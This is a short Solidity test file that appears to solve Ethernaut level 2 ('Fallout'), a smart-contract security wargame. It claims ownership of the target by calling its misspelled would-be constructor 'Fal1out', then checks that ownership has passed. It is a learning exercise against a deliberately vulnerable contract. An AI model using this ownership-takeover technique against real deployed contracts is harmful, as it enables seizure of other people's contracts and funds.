pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IFallout {
    function owner() external view returns (address);

    function Fal1out() external payable;
}

contract Ethernaut02 is EthernautTest {
    constructor() EthernautTest(2) {}

    function solve() internal override(EthernautTest) {
        IFallout(instance).Fal1out();

        require(IFallout(instance).owner() == address(this), "not owner");
    }
}
